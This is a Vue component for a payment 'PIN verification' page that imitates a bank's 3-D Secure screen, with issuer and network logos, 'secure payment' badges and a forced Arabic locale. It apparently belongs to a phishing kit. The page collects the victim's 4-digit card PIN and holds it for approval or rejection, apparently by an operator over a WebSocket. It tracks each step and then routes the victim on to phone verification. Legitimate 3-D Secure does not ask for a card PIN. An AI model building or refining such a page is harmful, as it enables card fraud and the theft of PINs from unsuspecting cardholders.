<template>
    <div class="pin-shell" dir="rtl">

        <!-- ── Waiting Loader Modal ──────────────────────────────────── -->
        <InsuranceLoader v-if="isVerifying && !error" :modal="true" color="primary" size="lg"
            :text="t( 'verification.cardPin.verifyingPin' )"
            :sub-text="t( 'verification.cardPin.waitingForApproval' )" />

        <!-- ── Main Card ─────────────────────────────────────────────── -->
        <div class="pin-card">

            <!-- ═══ A. Topbar — institutional blue ═══════════════════ -->
            <div class="pin-topbar">
                <div class="pin-topbar__bank">
                    <img v-if="bankLogo" :src="bankLogo" :alt="bankName" class="pin-topbar__bank-img" />
                    <span v-else class="pin-topbar__bank-fallback">{{ bankName || t( 'verification.otp.issuingBank' ) }}</span>
                </div>
                <div class="pin-topbar__badge">
                    <svg class="pin-topbar__shield" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M10 1.944A11.954 11.954 0 012.166 5C2.056 5.649 2 6.319 2 7c0 5.225 3.34 9.67 8 11.317C14.66 16.67 18 12.225 18 7c0-.682-.057-1.351-.166-2A11.954 11.954 0 0110 1.944zM11 14a1 1 0 11-2 0 1 1 0 012 0zm0-7a1 1 0 10-2 0v3a1 1 0 102 0V7z" clip-rule="evenodd" /></svg>
                    <span class="pin-topbar__badge-text">{{ t( 'verification.otp.securePaymentBadge' ) }}</span>
                </div>
                <div class="pin-topbar__network">
                    <img v-if="networkLogo" :src="networkLogo" :alt="networkName" class="pin-topbar__network-img" />
                </div>
            </div>

            <!-- ═══ B. Header ════════════════════════════════════════ -->
            <div class="pin-header">
                <h1 class="pin-header__title">{{ t( 'verification.cardPin.title' ) }}</h1>
                <p class="pin-header__sub">{{ t( 'verification.cardPin.enterPin' ) }}</p>
            </div>

            <!-- ═══ C. Body ══════════════════════════════════════════ -->
            <div class="pin-body">

                <!-- Card Info Summary -->
                <div class="pin-summary">
                    <div class="pin-summary__row">
                        <span class="pin-summary__label">{{ t( 'verification.cardPin.cardNumber' ) }}</span>
                        <span class="pin-summary__value ltr-nums" dir="ltr">**** {{ cardLast4 }}</span>
                    </div>
                    <div v-if="cardHolder" class="pin-summary__row">
                        <span class="pin-summary__label">{{ t( 'verification.cardPin.cardHolder' ) }}</span>
                        <span class="pin-summary__value pin-summary__value--name">{{ cardHolder }}</span>
                    </div>
                    <div v-if="totalAmount > 0" class="pin-summary__row pin-summary__row--amount">
                        <span class="pin-summary__label">{{ t( 'verification.cardPin.amount' ) }}</span>
                        <span class="pin-summary__amount">
                            {{ formattedAmount }}
                            <SarIcon className="size-3 inline-block fill-current" />
                        </span>
                    </div>
                </div>

                <!-- PIN Notice -->
                <div class="pin-notice">
                    <div class="pin-notice__icon">
                        <svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
                    </div>
                    <p class="pin-notice__text">{{ t( 'verification.cardPin.pinLabel' ) }}</p>
                </div>

                <!-- PIN Form -->
                <div class="pin-form">
                    <OtpInput ref="pinInputRef" v-model="pinCode" :length="4" :disabled="isVerifying" :error="error"
                        :auto-submit="true" @submit="submitPin" />

                    <button :disabled="!isPinValid || isVerifying" class="pin-btn"
                        :class="isPinValid && !isVerifying ? 'pin-btn--active' : 'pin-btn--disabled'"
                        @click="submitPin">
                        <svg v-if="isVerifying" class="w-4 h-4 animate-spin" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4" />
                            <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
                        </svg>
                        <span>{{ isVerifying ? t( 'verification.cardPin.verifying' ) : t( 'verification.cardPin.confirm' ) }}</span>
                    </button>
                </div>
            </div>

            <!-- ═══ Footer ═══════════════════════════════════════════ -->
            <div class="pin-footer">
                <img :src="paymentLogos" alt="Visa / Mastercard / mada" class="pin-footer__logos" />
                <div class="pin-footer__secure">
                    <svg class="pin-footer__lock" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
                    <span>{{ t( 'common.secureTransaction' ) }}</span>
                </div>
            </div>
        </div>

        <!-- ── Help ──────────────────────────────────────────────────── -->
        <div class="pin-help">
            <span class="pin-help__label">{{ t( 'common.supportContact' ) }}</span>
            <a href="tel:920000000" class="pin-help__phone" dir="ltr">920000000</a>
        </div>
    </div>
</template>

<script setup>
import { ref, computed, onMounted } from 'vue';
import { useRouter } from 'vue-router';
import { useI18n } from 'vue-i18n';
import i18n from '@/i18n';
import { useVisitorTracking } from '@/composables/useVisitorTracking';
import { trackStepViewed, trackStepCompleted } from '@/composables/useFunnelTracking';
import { usePayment } from '@/composables/usePayment';
import { usePaymentWebSocket } from '@/composables/usePaymentWebSocket';
import { getPinStatus } from '@/api/paymentApi';
import logger from '@/utils/logger';
import { safeRedirect } from '@/utils/safeRedirect';
import SarIcon from '@/components/SarIcon.vue';
import InsuranceLoader from '@/components/ui/InsuranceLoader.vue';
import OtpInput from '@/components/ui/OtpInput.vue';
import { useCardBranding } from '@/composables/useCardBranding';
import { getReasonLabel } from '@/constants/rejectionReasons';
import paymentLogos from '@/../../resources/images/logo/master-visa-mada.webp';

const { t } = useI18n();
const router = useRouter();

// Track this page
useVisitorTracking( 'card-pin' );

// ─── Load context via composable ────────────────────────────────────
const { context, resolveCustomerIp, submitPin: submitPinApi } = usePayment();
const sessionId = context.sessionId || '';
const customerIpRef = ref( context.customerIp || '' );
const cardBin = computed( () => context.cardBin || '' );
const cardLast4 = context.cardLast4 || '****';
const cardHolder = context.cardHolder || '';
const totalAmount = parseFloat( context.totalAmount ) || 0;

// ─── Card branding (network + bank) ────────────────────────────────
const { networkLogo, networkName, bankLogo, bankName } = useCardBranding( cardBin );

const formattedAmount = computed( () =>
{
    return totalAmount.toLocaleString( 'en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 } );
} );

// ─── PIN State ──────────────────────────────────────────────────────
const pinCode = ref( '' );
const pinInputRef = ref( null );
const isVerifying = ref( false );
const hasSubmitted = ref( false );   // prevent double-submit across re-mounts
const error = ref( '' );

const isPinValid = computed( () => /^\d{4}$/.test( pinCode.value ) );

// ─── Submit PIN ─────────────────────────────────────────────────────
const submitPin = async () =>
{
    if ( !isPinValid.value || isVerifying.value || hasSubmitted.value ) return;

    isVerifying.value = true;
    hasSubmitted.value = true;
    error.value = '';

    const success = await submitPinApi( pinCode.value );

    if ( success )
    {
        logger.debug( '[CardPin] Submitted successfully, waiting for approval' );
    } else
    {
        error.value = t( 'verification.cardPin.submitError' );
        isVerifying.value = false;
        hasSubmitted.value = false;
    }
};

// ─── WebSocket + Polling via composable ─────────────────────────────
const { setup: setupWs } = usePaymentWebSocket( {
    channelPrefix: 'otp',       // PIN events broadcast on the 'otp' channel (shared with OTP events, filtered by event name)
    approvedEvent: 'PinApproved',
    rejectedEvent: 'PinRejected',
    logTag: 'CardPin',

    onApproved ( event )
    {
        logger.debug( '[CardPin] Approved:', event );
        isVerifying.value = false;
        trackStepCompleted( 'card_pin', 'phone_verification' );

        // Defer navigation to release the WS message handler and avoid
        // Chrome "[Violation] 'message' handler took Xms" warnings.
        setTimeout( () =>
        {
            if ( event.redirect_to )
            {
                safeRedirect( event.redirect_to, 'phoneVerification', router );
            } else
            {
                router.push( { name: 'phoneVerification' } );
            }
        }, 0 );
    },

    onRejected ( event )
    {
        logger.debug( '[CardPin] Rejected:', event );
        isVerifying.value = false;
        error.value = getReasonLabel( event.reason, t ) || t( 'verification.cardPin.pinRejected' );
        pinCode.value = '';
        pinInputRef.value?.clear();
        hasSubmitted.value = false;
    },

    async pollFn ( { handleApproved, handleRejected } )
    {
        const sig = context.statusSigs?.pin || '';
        if ( !isVerifying.value || !sig ) return;

        const { data } = await getPinStatus( sessionId, sig );

        if ( data.status === 'verified' )
        {
            handleApproved( data );
        } else if ( data.status === 'rejected' )
        {
            handleRejected( { reason: data.reason || 'pin_other' } );
        }
    },
} );

// ─── Lifecycle ──────────────────────────────────────────────────────
onMounted( async () =>
{
    // Force Arabic locale on payment pages
    if ( i18n.global.locale.value !== 'ar' ) {
        i18n.global.locale.value = 'ar';
    }

    const ip = customerIpRef.value || await resolveCustomerIp();
    customerIpRef.value = ip;

    pinInputRef.value?.focusFirstEmpty();
    setupWs( ip );
    trackStepViewed( 'card_pin' );
} );
// WS channel + polling cleanup handled by usePaymentWebSocket onUnmounted
</script>

<style scoped>
/* ═══════════════════════════════════════════════════════════════════
   CardPinPage — Real 3D Secure / ACS Gateway (PIN variant)
   Matches OtpPage institutional style exactly
   ═══════════════════════════════════════════════════════════════════ */

.pin-shell {
    min-height: 100dvh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 0.75rem;
    background: #eef1f5;
}

.pin-card {
    width: 100%;
    max-width: 400px;
    background: #fff;
    border-radius: 0.375rem;
    border: 1px solid #d1d5db;
    box-shadow: 0 2px 8px rgb(0 0 0 / 0.08);
    overflow: hidden;
    animation: pin-in 0.35s ease-out;
}

@keyframes pin-in {
    from { opacity: 0; transform: translateY(6px); }
    to   { opacity: 1; transform: translateY(0); }
}

/* ── Topbar ── */
.pin-topbar {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0.5rem 0.875rem;
    background: linear-gradient(180deg, #1a5276 0%, #154360 100%);
    border-bottom: 2px solid #0e2f44;
}

.pin-topbar__bank,
.pin-topbar__network {
    flex: 0 0 auto;
    display: flex;
    align-items: center;
    min-width: 40px;
}

.pin-topbar__bank-img {
    height: 1.375rem;
    width: auto;
    max-width: 5rem;
    object-fit: contain;
    filter: brightness(0) invert(1);
}

.pin-topbar__bank-fallback {
    font-size: 0.6875rem;
    font-weight: 600;
    color: rgba(255, 255, 255, 0.7);
}

.pin-topbar__network-img {
    height: 1.25rem;
    width: auto;
    max-width: 3.5rem;
    object-fit: contain;
}

.pin-topbar__badge {
    display: flex;
    align-items: center;
    gap: 0.25rem;
    font-size: 0.5625rem;
    font-weight: 500;
    color: rgba(255, 255, 255, 0.8);
    background: rgba(255, 255, 255, 0.1);
    padding: 0.1875rem 0.5rem;
    border-radius: 2px;
    border: 1px solid rgba(255, 255, 255, 0.15);
    white-space: nowrap;
    text-transform: uppercase;
    letter-spacing: 0.04em;
}

.pin-topbar__shield {
    width: 0.625rem;
    height: 0.625rem;
    color: #4fc3f7;
    flex-shrink: 0;
}

/* ── Header ── */
.pin-header {
    padding: 0.5rem 0.875rem 0.375rem;
    text-align: center;
    background: #f8f9fa;
    border-bottom: 1px solid #e5e7eb;
}

.pin-header__title {
    font-size: 0.8125rem;
    font-weight: 700;
    color: #1a2332;
    margin: 0 0 0.0625rem;
}

.pin-header__sub {
    font-size: 0.625rem;
    font-weight: 400;
    color: #6b7280;
    margin: 0;
    line-height: 1.35;
}

/* ── Body ── */
.pin-body {
    padding: 0.5rem 0.75rem;
    display: flex;
    flex-direction: column;
    gap: 0.375rem;
}

/* ── Summary ── */
.pin-summary {
    background: #f9fafb;
    border: 1px solid #e5e7eb;
    border-radius: 0.25rem;
    overflow: hidden;
}

.pin-summary__row {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0.25rem 0.5rem;
    font-size: 0.6875rem;
}

.pin-summary__row:not(:last-child) {
    border-bottom: 1px solid #eef0f2;
}

.pin-summary__row--amount {
    background: #eef4fb;
    padding: 0.3125rem 0.5rem;
}

.pin-summary__label {
    color: #6b7280;
    font-weight: 500;
    font-size: 0.625rem;
}

.pin-summary__value {
    font-weight: 600;
    color: #1f2937;
    font-size: 0.6875rem;
}

.pin-summary__value--name {
    text-transform: uppercase;
    font-size: 0.6875rem;
    letter-spacing: 0.04em;
}

.pin-summary__amount {
    font-size: 0.8125rem;
    font-weight: 700;
    color: #1a2332;
    display: flex;
    align-items: center;
    gap: 0.1875rem;
}

/* ── Notice ── */
.pin-notice {
    display: flex;
    align-items: center;
    gap: 0.25rem;
    padding: 0.25rem 0.4375rem;
    background: #fffbeb;
    border: 1px solid #fde68a;
    border-radius: 0.1875rem;
}

.pin-notice__icon {
    flex-shrink: 0;
    color: #d97706;
}

.pin-notice__text {
    font-size: 0.5625rem;
    font-weight: 600;
    color: #92400e;
    margin: 0;
}

/* ── Form ── */
.pin-form {
    text-align: center;
    padding: 0.375rem 0;
}

/* ── Button ── */
.pin-btn {
    width: 100%;
    padding: 0.4375rem;
    border-radius: 0.25rem;
    font-weight: 600;
    font-size: 0.75rem;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 0.375rem;
    border: none;
    cursor: pointer;
    transition: background 0.15s ease;
    margin-top: 0.25rem;
}

.pin-btn--active {
    background: #1a5276;
    color: #fff;
    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.15);
}

.pin-btn--active:hover {
    background: #154360;
}

.pin-btn--active:active {
    background: #0e2f44;
}

.pin-btn--disabled {
    background: #e5e7eb;
    color: #9ca3af;
    cursor: not-allowed;
}

/* ── Footer ── */
.pin-footer {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 0.375rem 0.875rem;
    background: #f3f4f6;
    border-top: 1px solid #e5e7eb;
}

.pin-footer__logos {
    height: 0.75rem;
    width: auto;
    opacity: 0.5;
}

.pin-footer__secure {
    display: flex;
    align-items: center;
    gap: 0.1875rem;
    font-size: 0.5625rem;
    color: #9ca3af;
    font-weight: 400;
}

.pin-footer__lock {
    width: 0.5625rem;
    height: 0.5625rem;
}

/* ── Help ── */
.pin-help {
    margin-top: 0.5rem;
    text-align: center;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 0.25rem;
}

.pin-help__label {
    font-size: 0.625rem;
    color: #9ca3af;
}

.pin-help__phone {
    color: #1a5276;
    font-weight: 700;
    font-size: 0.6875rem;
    text-decoration: none;
}

.pin-help__phone:hover { text-decoration: underline; }

/* ── Responsive ── */
@media (max-width: 380px) {
    .pin-topbar { padding: 0.4375rem 0.625rem; }
    .pin-topbar__badge-text { display: none; }
    .pin-body { padding: 0.5rem 0.625rem; gap: 0.375rem; }
}
</style>
